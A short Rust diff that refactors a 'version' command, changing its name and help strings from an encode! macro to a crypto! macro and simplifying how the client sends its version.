@@ -5,12 +5,12 @@ pub struct Version;
 
 #[async_trait]
 impl Command for Version {
-    fn name(&self) -> &'static str {
-        encode!("version")
+    fn name(&self) -> String {
+        crypto!("version")
     }
 
-    fn help(&self) -> &'static str {
-        encode!("get version of the client")
+    fn help(&self) -> String {
+        crypto!("get version of the client")
     }
 
     fn min_args(&self) -> usize {
@@ -18,6 +18,6 @@ impl Command for Version {
     }
 
     async fn execute(&self, client: &mut Client, _args: Vec<&str>) -> anyhow::Result<()> {
-        Ok(client.send(globals::CURRENT_VERSION)?)
+        client.send(globals::CURRENT_VERSION)
     }
 }
